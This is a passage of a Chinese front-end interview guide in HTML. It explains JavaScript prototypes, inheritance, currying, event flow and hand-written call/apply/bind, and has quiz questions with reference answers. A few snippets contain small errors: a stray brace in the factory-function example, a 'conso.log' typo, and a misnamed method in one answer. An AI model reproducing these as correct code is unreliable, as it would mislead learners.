obj={&#39;name&#39;:&#39;张三&#39;}</code></pre><p>2.Object构造函数创建</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> Obj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Obj<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'张三'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3.使用工厂模式创建对象</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">createPerson</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> o<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">return</span> o<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.使用构造函数创建对象</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、简述一下前端事件流"><a href="#5、简述一下前端事件流" class="headerlink" title="5、简述一下前端事件流"></a>5、简述一下前端事件流</h3><p><code>参考答案</code></p><p>HTML中与javascript交互是通过事件驱动来实现的，例如鼠标点击事件onclick、页面的滚动事件onscroll等等，可以向文档或者文档中的元素添加事件侦听器来预订事件。想要知道这些事件是在什么时候进行调用的，就需要了解一下“事件流”的概念。</p><p>什么是事件流：事件流描述的是从页面中接收事件的顺序,DOM2级事件流包括下面几个阶段。</p><ul><li>事件捕获阶段</li><li>处于目标阶段</li><li>事件冒泡阶段</li></ul><p><strong>addEventListener</strong>：<strong>addEventListener</strong>是DOM2 级事件新增的指定事件处理程序的操作，这个方法接收3个参数：要处理的事件名、作为事件处理程序的函数和一个布尔值。最后这个布尔值参数如果是true，表示在捕获阶段调用事件处理程序；如果是false，表示在冒泡阶段调用事件处理程序。</p><p><strong>IE只支持事件冒泡</strong>。</p><h3 id="6、Function-proto-getPrototypeOf-是什么？"><a href="#6、Function-proto-getPrototypeOf-是什么？" class="headerlink" title="6、Function._proto_(getPrototypeOf)是什么？"></a>6、<code>Function._proto_(getPrototypeOf)是什么？</code></h3><p><code>参考答案</code></p><p>获取一个对象的原型，在chrome中可以通过<strong>proto</strong>的形式，或者在ES6中可以通过Object.getPrototypeOf的形式。</p><p>那么Function.proto是什么么？也就是说Function由什么对象继承而来，我们来做如下判别。</p><pre class="line-numbers language-js"><code class="language-js">Function<span class="token punctuation">.</span>__proto__<span class="token operator">==</span>Object<span class="token punctuation">.</span>prototype <span class="token comment" spellcheck="true">//false</span>Function<span class="token punctuation">.</span>__proto__<span class="token operator">==</span>Function<span class="token punctuation">.</span>prototype<span class="token comment" spellcheck="true">//true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们发现Function的原型也是Function。</p><p>我们用图可以来明确这个关系：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/mianshi.png" alt="image-20190914235210887"></p><h3 id="7、简述一下原型-构造函数-实例"><a href="#7、简述一下原型-构造函数-实例" class="headerlink" title="7、简述一下原型 / 构造函数 / 实例"></a>7、简述一下原型 / 构造函数 / 实例</h3><p><code>参考答案</code>  </p><ul><li>原型<code>(prototype)</code>: 一个简单的对象，用于实现对象的 <strong>属性继承</strong>。可以简单的理解成对象的爹。在 Firefox 和 Chrome 中，每个<code>JavaScript</code>对象中都包含一个<code>__proto__</code>(非标准)的属性指向它爹(该对象的原型)，可<code>obj.__proto__</code>进行访问。</li><li>构造函数: 可以通过<code>new</code>来 <strong>新建一个对象</strong>的函数。</li><li>实例: 通过构造函数和<code>new</code>创建出来的对象，便是实例。 <strong>实例通过<strong>proto</strong>指向原型，通过constructor指向构造函数</strong>。</li></ul><p>这里来举个栗子，以<code>Object</code>为例，我们常用的<code>Object</code>便是一个构造函数，因此我们可以通过它构建实例。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 实例</span><span class="token keyword">const</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>则此时， <strong>实例为instance</strong>, <strong>构造函数为Object</strong>，我们知道，构造函数拥有一个<code>prototype</code>的属性指向原型，因此原型为:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 原型</span><span class="token keyword">const</span> prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span>prototype<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里我们可以来看出三者的关系:</p><pre class="line-numbers language-js"><code class="language-js">实例<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> 原型原型<span class="token punctuation">.</span>constructor <span class="token operator">===</span> 构造函数构造函数<span class="token punctuation">.</span>prototype <span class="token operator">===</span> 原型<span class="token comment" spellcheck="true">// 这条线其实是是基于原型进行获取的，可以理解成一条基于原型的映射线</span><span class="token comment" spellcheck="true">// 例如: </span><span class="token comment" spellcheck="true">// const o = new Object()</span><span class="token comment" spellcheck="true">// o.constructor === Object   --> true</span><span class="token comment" spellcheck="true">// o.__proto__ = null;</span><span class="token comment" spellcheck="true">// o.constructor === Object   --> false</span>实例<span class="token punctuation">.</span>constructor <span class="token operator">===</span> 构造函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8、简述一下JS继承，并举例"><a href="#8、简述一下JS继承，并举例" class="headerlink" title="8、简述一下JS继承，并举例"></a>8、简述一下JS继承，并举例</h3><p><code>参考答案</code>  </p><p>在 JS 中，继承通常指的便是 <strong>原型链继承</strong>，也就是通过指定原型，并可以通过原型链继承原型上的属性或者方法。</p><ul><li><p>最优化: <strong>圣杯模式</strong></p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> inherit <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> F <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>        F<span class="token punctuation">.</span>prototype <span class="token operator">=</span> p<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>        c<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span>uber <span class="token operator">=</span> p<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>        c<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> c<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用 ES6 的语法糖 <code>class / extends</code></p></li></ul><h3 id="9、函数柯里化"><a href="#9、函数柯里化" class="headerlink" title="9、函数柯里化"></a>9、函数柯里化</h3><p><code>参考答案</code></p><p>在函数式编程中，函数是一等公民。那么函数柯里化是怎样的呢？</p><p>函数柯里化指的是将能够接收多个参数的函数转化为接收单一参数的函数，并且返回接收余下参数且返回结果的新函数的技术。</p><p>函数柯里化的主要作用和特点就是参数复用、提前返回和延迟执行。</p><p>在一个函数中，首先填充几个参数，然后再返回一个新的函数的技术，称为函数的柯里化。通常可用于在不侵入函数的前提下，为函数 <strong>预置通用参数</strong>，供多次重复调用。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> add <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> x <span class="token operator">+</span> y    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> add1 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token function">add1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token function">add1</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">21</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10、说说bind、call、apply-区别？"><a href="#10、说说bind、call、apply-区别？" class="headerlink" title="10、说说bind、call、apply 区别？"></a>10、说说bind、call、apply 区别？</h3><p><code>参考答案</code>  </p><p><code>call</code> 和 <code>apply</code> 都是为了解决改变 <code>this</code> 的指向。作用都是相同的，只是传参的方式不同。</p><p>除了第一个参数外，<code>call</code> 可以接收一个参数列表，<code>apply</code> 只接受一个参数数组。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    value<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getValue</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span>getValue<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'yck'</span><span class="token punctuation">,</span> <span class="token string">'24'</span><span class="token punctuation">)</span>getValue<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'yck'</span><span class="token punctuation">,</span> <span class="token string">'24'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>bind</code>和其他两个方法作用也是一致的，只是该方法会返回一个函数。并且我们可以通过 <code>bind</code>实现柯里化。</p><p><code>（下面是对这三个方法的扩展介绍）</code></p><p><strong>如何实现一个 bind 函数</strong></p><p>对于实现以下几个函数，可以从几个方面思考</p><ul><li>不传入第一个参数，那么默认为 <code>window</code></li><li>改变了 this 指向，让新的对象可以执行该函数。那么思路是否可以变成给新的对象添加一个函数，然后在执行完以后删除？</li></ul><pre class="line-numbers language-js"><code class="language-js">Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myBind <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">var</span> _this <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 返回一个函数</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 因为返回了一个函数，我们可以 new F()，所以需要判断</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">F</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">_this</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> <span class="token operator">...</span>arguments<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> _this<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如何实现一个call函数</strong></p><pre class="line-numbers language-js"><code class="language-js">Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myCall <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> context <span class="token operator">=</span> context <span class="token operator">||</span> window  <span class="token comment" spellcheck="true">// 给 context 添加一个属性</span>  <span class="token comment" spellcheck="true">// getValue.call(a, 'yck', '24') => a.fn = getValue</span>  context<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token comment" spellcheck="true">// 将 context 后面的参数取出来</span>  <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// getValue.call(a, 'yck', '24') => a.fn('yck', '24')</span>  <span class="token keyword">var</span> result <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 删除 fn</span>  <span class="token keyword">delete</span> context<span class="token punctuation">.</span>fn  <span class="token keyword">return</span> result<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如何实现一个apply函数</strong></p><pre class="line-numbers language-js"><code class="language-js">Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myApply <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> context <span class="token operator">=</span> context <span class="token operator">||</span> window  context<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token keyword">var</span> result  <span class="token comment" spellcheck="true">// 需要判断是否存储第二个参数</span>  <span class="token comment" spellcheck="true">// 如果存在，就将第二个参数展开</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    result <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    result <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">delete</span> context<span class="token punctuation">.</span>fn  <span class="token keyword">return</span> result<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11、箭头函数的特点"><a href="#11、箭头函数的特点" class="headerlink" title="11、箭头函数的特点"></a>11、箭头函数的特点</h3><p><code>参考答案</code> </p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>箭头函数其实是没有 <code>this</code>的，这个函数中的 <code>this</code>只取决于他外面的第一个不是箭头函数的函数的 <code>this</code>。在这个例子中，因为调用 <code>a</code>符合前面代码中的第一个情况，所以 <code>this</code>是 <code>window</code>。并且 <code>this</code>一旦绑定了上下文，就不会被任何代码改变。</p><h2 id="程序阅读题"><a href="#程序阅读题" class="headerlink" title="程序阅读题"></a>程序阅读题</h2><h3 id="1、下面程序输出的结果是什么？"><a href="#1、下面程序输出的结果是什么？" class="headerlink" title="1、下面程序输出的结果是什么？"></a>1、下面程序输出的结果是什么？</h3><pre><code>function sayHi() {  console.log(name);  console.log(age);  var name = &quot;Lydia&quot;;  let age = 21;}sayHi();</code></pre><ul><li>A: <code>Lydia</code> 和 <code>undefined</code></li><li>B: <code>Lydia</code> 和 <code>ReferenceError</code></li><li>C: <code>ReferenceError</code> 和 <code>21</code></li><li>D: <code>undefined</code> 和 <code>ReferenceError</code></li></ul><p><code>参考答案</code></p><p>在函数中，我们首先使用<code>var</code>关键字声明了<code>name</code>变量。 这意味着变量在创建阶段会被提升（<code>JavaScript</code>会在创建变量创建阶段为其分配内存空间），默认值为<code>undefined</code>，直到我们实际执行到使用该变量的行。 我们还没有为<code>name</code>变量赋值，所以它仍然保持<code>undefined</code>的值。</p><p>使用<code>let</code>关键字（和<code>const</code>）声明的变量也会存在变量提升，但与<code>var</code>不同，初始化没有被提升。 在我们声明（初始化）它们之前，它们是不可访问的。 这被称为“暂时死区”。 当我们在声明变量之前尝试访问变量时，<code>JavaScript</code>会抛出一个<code>ReferenceError</code>。</p><p>关于<code>let</code>的是否存在变量提升，我们何以用下面的例子来验证：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">'ConardLi'</span><span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Uncaught ReferenceError: name is not defined</span>  <span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">'code秘密花园'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>let</code>变量如果不存在变量提升，<code>console.log(name)</code>就会输出<code>ConardLi</code>，结果却抛出了<code>ReferenceError</code>，那么这很好的说明了，<code>let</code>也存在变量提升，但是它存在一个“暂时死区”，在变量未初始化或赋值前不允许访问。</p><p>变量的赋值可以分为三个阶段：</p><ul><li>创建变量，在内存中开辟空间</li><li>初始化变量，将变量初始化为<code>undefined</code></li><li>真正赋值</li></ul><p>关于<code>let</code>、<code>var</code>和<code>function</code>：</p><ul><li><code>let</code>的「创建」过程被提升了，但是初始化没有提升。</li><li><code>var</code>的「创建」和「初始化」都被提升了。</li><li><code>function</code>的「创建」「初始化」和「赋值」都被提升了。</li></ul><h3 id="2、下面代码输出什么"><a href="#2、下面代码输出什么" class="headerlink" title="2、下面代码输出什么"></a>2、下面代码输出什么</h3><pre><code>var a = 10;(function () {    console.log(a)    a = 5    console.log(window.a)    var a = 20;    console.log(a)})()</code></pre><p>依次输出：undefined -&gt; 10 -&gt; 20</p><pre><code>在立即执行函数中，var a = 20; 语句定义了一个局部变量 a，由于js的变量声明提升机制，局部变量a的声明会被提升至立即执行函数的函数体最上方，且由于这样的提升并不包括赋值，因此第一条打印语句会打印undefined，最后一条语句会打印20。由于变量声明提升，a = 5; 这条语句执行时，局部的变量a已经声明，因此它产生的效果是对局部的变量a赋值，此时window.a 依旧是最开始赋值的10，</code></pre><h3 id="3、下面的输出结果是什么？"><a href="#3、下面的输出结果是什么？" class="headerlink" title="3、下面的输出结果是什么？"></a>3、下面的输出结果是什么？</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Chameleon</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token function">colorChange</span><span class="token punctuation">(</span>newColor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>newColor <span class="token operator">=</span> newColor<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">{</span> newColor <span class="token operator">=</span> <span class="token string">"green"</span> <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>newColor <span class="token operator">=</span> newColor<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> freddie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Chameleon</span><span class="token punctuation">(</span><span class="token punctuation">{</span> newColor<span class="token punctuation">:</span> <span class="token string">"purple"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>freddie<span class="token punctuation">.</span><span class="token function">colorChange</span><span class="token punctuation">(</span><span class="token string">"orange"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>A: <code>orange</code></li><li>B: <code>purple</code></li><li>C: <code>green</code></li><li>D: <code>TypeError</code></li></ul><p>答案: D</p><p><code>colorChange</code>方法是静态的。 静态方法仅在创建它们的构造函数中存在，并且不能传递给任何子级。 由于<code>freddie</code>是一个子级对象，函数不会传递，所以在<code>freddie</code>实例上不存在<code>freddie</code>方法：抛出<code>TypeError</code>。</p><h3 id="4、下面代码中什么时候会输出1？"><a href="#4、下面代码中什么时候会输出1？" class="headerlink" title="4、下面代码中什么时候会输出1？"></a>4、下面代码中什么时候会输出1？</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     conso<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code></p><blockquote><p>因为==会进行隐式类型转换 所以我们重写toString方法就可以了</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>  i<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5、下面的输出结果是什么？"><a href="#5、下面的输出结果是什么？" class="headerlink" title="5、下面的输出结果是什么？"></a>5、下面的输出结果是什么？</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span>    <span class="token string">'length'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token string">'splice'</span><span class="token punctuation">:</span> Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>splice<span class="token punctuation">,</span>    <span class="token string">'push'</span><span class="token punctuation">:</span> Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>push<span class="token punctuation">}</span>obj<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code>  </p><p>1.使用第一次push，obj对象的push方法设置 <code>obj[2]=1;obj.length+=1</code><br>2.使用第二次push，obj对象的push方法设置 <code>obj[3]=2;obj.length+=1</code><br>3.使用console.log输出的时候，因为obj具有 length 属性和 splice 方法，故将其作为数组进行打印<br>4.打印时因为数组未设置下标为 0 1 处的值，故打印为empty，主动 obj[0] 获取为 undefined</p><p><img src="https://user-images.githubusercontent.com/26674103/55368589-3605a000-5525-11e9-8c20-c5aeea6b1880.png" alt></p><h3 id="6、下面代码输出的结果是什么？"><a href="#6、下面代码输出的结果是什么？" class="headerlink" title="6、下面代码输出的结果是什么？"></a>6、下面代码输出的结果是什么？</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>n<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>a<span class="token punctuation">.</span>x <span class="token operator">=</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>n<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">)</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span aria-hidden="true" 